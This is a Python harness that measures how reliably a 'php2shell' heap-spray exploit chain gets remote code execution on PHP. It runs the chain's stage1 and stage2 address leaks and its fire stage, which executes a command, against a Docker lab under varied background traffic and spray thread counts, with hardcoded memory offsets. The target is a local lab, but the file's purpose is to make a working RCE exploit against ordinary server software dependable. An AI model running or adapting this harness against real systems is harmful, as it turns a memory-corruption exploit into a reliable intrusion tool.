#!/usr/bin/env python3
"""
Reliability harness for php2shell spray chain under concurrent traffic.

Measures success rate and time-to-shell across load levels, spray thread
counts, and request patterns. Restarts the lab container between configs
to avoid heap-degradation confounds.

Usage:
    python3 reliability.py                    # full matrix
    python3 reliability.py --quick            # fast sanity (1 trial per config)
    python3 reliability.py --load heavy --trials 10  # one load level, 10 trials
"""
import argparse, json, os, socket, subprocess, sys, threading, time, random

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import php2shell as P

CONTAINER = "php2shell-lab"
URL_DIRECT = "http://127.0.0.1:8090/"
URL_PROXY  = "http://127.0.0.1:8095/"
ZIF, DTOR = 0x465370, 0x65eb60
HTDATA = 0x690d8
HUGE = 12
CMD = "id>/tmp/rl"
PROOF_FILE = "/tmp/rl"
URL = URL_DIRECT  # set by --proxy flag

# ----------------------------------------------------------------- load generators

class LoadGen:
    """Background traffic generator. Starts threads that hammer the target."""
    def __init__(self, url, pattern, nthreads):
        self.url = url
        self.pattern = pattern
        self.nthreads = nthreads
        self._stop = threading.Event()
        self._threads = []
        self._count = 0
        self._lock = threading.Lock()

    def start(self):
        if self.nthreads <= 0 or self.pattern == "none":
            return
        for _ in range(self.nthreads):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()
            self._threads.append(t)

    def stop(self):
        self._stop.set()
        for t in self._threads:
            t.join(timeout=5)
        return self._count

    def _worker(self):
        u = __import__("urllib.parse", fromlist=["urlsplit"]).urlsplit(self.url)
        while not self._stop.is_set():
            try:
                s = socket.create_connection((u.hostname, u.port or 80), timeout=5)
                for _ in range(random.randint(1, 10)):
                    if self._stop.is_set():
                        break
                    req = self._make_request(u)
                    s.sendall(req)
                    self._drain(s)
                    with self._lock:
                        self._count += 1
                s.close()
            except Exception:
                pass

    def _make_request(self, u):
        if self.pattern == "get":
            return (f"GET {u.path or '/'} HTTP/1.1\r\n"
                    f"Host: {u.hostname}:{u.port or 80}\r\n"
                    f"Connection: keep-alive\r\n\r\n").encode()
        elif self.pattern == "mixed":
            if random.random() < 0.3:
                body = os.urandom(random.randint(100, 8000))
                return (f"POST {u.path or '/'} HTTP/1.1\r\n"
                        f"Host: {u.hostname}:{u.port or 80}\r\n"
                        f"Content-Type: application/octet-stream\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"Connection: keep-alive\r\n\r\n").encode() + body
            return (f"GET {u.path or '/'} HTTP/1.1\r\n"
                    f"Host: {u.hostname}:{u.port or 80}\r\n"
                    f"Connection: keep-alive\r\n\r\n").encode()
        elif self.pattern == "upload":
            # multipart upload (exercises the rfc1867 path that the exploit uses)
            boundary = b"loadtest" + str(random.randint(1000, 9999)).encode()
            body = (b"--" + boundary + b"\r\n"
                    b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nload\r\n'
                    b"--" + boundary + b"\r\n"
                    b'Content-Disposition: form-data; name="f"; filename="test.bin"\r\n'
                    b"Content-Type: application/octet-stream\r\n\r\n" +
                    os.urandom(random.randint(500, 5000)) +
                    b"\r\n--" + boundary + b"--\r\n")
            return (f"POST {u.path or '/'} HTTP/1.1\r\n"
                    f"Host: {u.hostname}:{u.port or 80}\r\n"
                    f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: keep-alive\r\n\r\n").encode() + body
        # burst: heavy for 2s, quiet for 1s
        elif self.pattern == "burst":
            phase = int(time.time()) % 3
            if phase < 2:
                return self._make_request_inner(u, "mixed")
            time.sleep(0.3 + random.random() * 0.5)
            return (f"GET {u.path or '/'} HTTP/1.1\r\n"
                    f"Host: {u.hostname}:{u.port or 80}\r\n"
                    f"Connection: keep-alive\r\n\r\n").encode()
        return (f"GET {u.path or '/'} HTTP/1.1\r\n"
                f"Host: {u.hostname}:{u.port or 80}\r\n"
                f"Connection: keep-alive\r\n\r\n").encode()

    def _make_request_inner(self, u, pattern):
        old = self.pattern
        self.pattern = pattern
        r = self._make_request(u)
        self.pattern = old
        return r

    def _drain(self, s):
        s.settimeout(2)
        try:
            buf = b""
            while b"\r\n\r\n" not in buf:
                c = s.recv(8192)
                if not c:
                    break
                buf += c
            if b"Content-Length:" in buf:
                head, rest = buf.split(b"\r\n\r\n", 1)
                for line in head.split(b"\r\n"):
                    if line.lower().startswith(b"content-length:"):
                        cl = int(line.split(b":")[1])
                        while len(rest) < cl:
                            c = s.recv(8192)
                            if not c:
                                break
                            rest += c
                        break
        except Exception:
            pass

# ----------------------------------------------------------------- exploit runner

def restart_lab():
    subprocess.run(["docker", "restart", CONTAINER], capture_output=True, timeout=30)
    for _ in range(30):
        try:
            s = socket.create_connection(("127.0.0.1", 8090), timeout=2)
            s.sendall(b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
            if b"HTTP/1.1 200" in s.recv(4096):
                s.close()
                time.sleep(0.5)
                return True
            s.close()
        except Exception:
            pass
        time.sleep(0.5)
    return False

def clear_proof():
    subprocess.run(["docker", "exec", CONTAINER, "sh", "-c", f"rm -f {PROOF_FILE}"],
                   capture_output=True, timeout=10)

def check_proof():
    r = subprocess.run(["docker", "exec", CONTAINER, "sh", "-c", f"cat {PROOF_FILE} 2>/dev/null"],
                       capture_output=True, text=True, timeout=10)
    return r.stdout.strip()

def run_trial(spray_threads, phase_timeout):
    """Run one full exploit attempt: leak1 + leak2 + fire. Returns (success, seconds, detail)."""
    t0 = time.time()

    chunk = P.spray_phase(URL, "stage1", ZIF, DTOR, 0, HUGE, spray_threads, phase_timeout)
    t_leak1 = time.time() - t0
    if not chunk:
        return False, time.time() - t0, f"stage1 failed ({t_leak1:.1f}s)"

    libphp = P.spray_phase(URL, "stage2", ZIF, DTOR, 0, HUGE, spray_threads, phase_timeout)
    t_leak2 = time.time() - t0 - t_leak1
    if not libphp:
        return False, time.time() - t0, f"stage2 failed ({t_leak2:.1f}s)"

    HT = chunk + HTDATA
    ZIFA = libphp + ZIF
    clear_proof()

    stop = threading.Event()
    dl = time.time() + phase_timeout
    n = [0]

    def fire():
        ex = P._mkexp(URL, CMD, ZIF, DTOR, HTDATA, HUGE)
        ex.zif = ZIFA
        while not stop.is_set() and time.time() < dl:
            try:
                ex.stage3_9bie(HT)
            except Exception:
                pass
            n[0] += 1

    ths = [threading.Thread(target=fire, daemon=True) for _ in range(spray_threads)]
    for x in ths:
        x.start()

    proof = ""
    while time.time() < dl:
        proof = check_proof()
        if proof:
            break
        time.sleep(0.5)
    stop.set()
    total = time.time() - t0

    if proof:
        return True, total, f"RCE ({proof}) leak1={t_leak1:.1f}s leak2={t_leak2:.1f}s fire={total-t_leak1-t_leak2:.1f}s n={n[0]}"
    return False, total, f"fire failed ({n[0]} attempts, {total:.1f}s)"


# ----------------------------------------------------------------- configs

LOAD_CONFIGS = {
    "none":      ("none",   0),
    "light":     ("get",    3),
    "medium":    ("get",    10),
    "heavy_get": ("get",    20),
    "mixed":     ("mixed",  10),
    "upload":    ("upload",  8),
    "burst":     ("burst",  12),
    "heavy_mix": ("mixed",  20),
    "saturate":  ("mixed",  30),
}

def run_config(load_name, spray_threads, trials, phase_timeout):
    pattern, load_threads = LOAD_CONFIGS[load_name]
    results = []
    for i in range(trials):
        print(f"\n  [{load_name} / spray={spray_threads}] trial {i+1}/{trials}: restarting lab...", end=" ", flush=True)
        if not restart_lab():
            print("RESTART FAILED", flush=True)
            results.append({"ok": False, "time": 0, "detail": "restart failed"})
            continue

        load = LoadGen(URL, pattern, load_threads)
        load.start()
        time.sleep(1)  # let load ramp

        ok, dt, detail = run_trial(spray_threads, phase_timeout)
        load_count = load.stop()
        results.append({"ok": ok, "time": round(dt, 1), "detail": detail, "bg_reqs": load_count})
        tag = "OK" if ok else "FAIL"
        print(f"{tag} {dt:.1f}s  bg={load_count}  {detail}", flush=True)

    wins = sum(1 for r in results if r["ok"])
    times = [r["time"] for r in results if r["ok"]]
    avg_t = sum(times) / len(times) if times else 0
    return {
        "load": load_name, "spray_threads": spray_threads, "trials": trials,
        "wins": wins, "rate": f"{wins}/{trials}",
        "avg_time": round(avg_t, 1) if times else None,
        "results": results,
    }


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--quick", action="store_true", help="1 trial per config (sanity check)")
    ap.add_argument("--trials", type=int, default=5)
    ap.add_argument("--load", default=None, help="single load to test (none/light/medium/heavy_get/mixed/upload/burst/heavy_mix)")
    ap.add_argument("--spray", type=int, default=None, help="single spray thread count")
    ap.add_argument("--timeout", type=int, default=60, help="per-phase budget (s)")
    ap.add_argument("--proxy", action="store_true", help="exploit through nginx proxy (:8095)")
    ap.add_argument("--out", default=None, help="write JSON results to file")
    a = ap.parse_args()

    global URL
    if a.proxy:
        URL = URL_PROXY

    trials = 1 if a.quick else a.trials

    loads = [a.load] if a.load else ["none", "light", "medium", "heavy_get", "mixed", "upload", "burst"]
    sprays = [a.spray] if a.spray else [8, 12, 16]

    all_results = []
    print(f"=== php2shell reliability test ===")
    print(f"target: {URL} ({CONTAINER})  trials/config: {trials}  timeout: {a.timeout}s")
    print(f"loads: {loads}  spray_threads: {sprays}")

    for load in loads:
        for spray in sprays:
            print(f"\n{'='*60}")
            print(f"CONFIG: load={load} spray_threads={spray} trials={trials}")
            print(f"{'='*60}")
            r = run_config(load, spray, trials, a.timeout)
            all_results.append(r)
            print(f"\n>>> {r['rate']}  avg={r['avg_time']}s")

    # summary table
    print(f"\n{'='*70}")
    print(f"{'LOAD':<12} {'SPRAY':>5} {'RATE':>7} {'AVG(s)':>7} {'DETAIL'}")
    print(f"{'-'*70}")
    for r in all_results:
        det = ""
        fails = [x for x in r["results"] if not x["ok"]]
        if fails:
            det = "; ".join(set(x["detail"].split("(")[0].strip() for x in fails[:3]))
        at = f"{r['avg_time']:.1f}" if r['avg_time'] else "-"
        print(f"{r['load']:<12} {r['spray_threads']:>5} {r['rate']:>7} {at:>7} {det}")
    print(f"{'='*70}")

    if a.out:
        with open(a.out, "w") as f:
            json.dump(all_results, f, indent=2)
        print(f"\nResults written to {a.out}")

    return 0

if __name__ == "__main__":
    sys.exit(main())
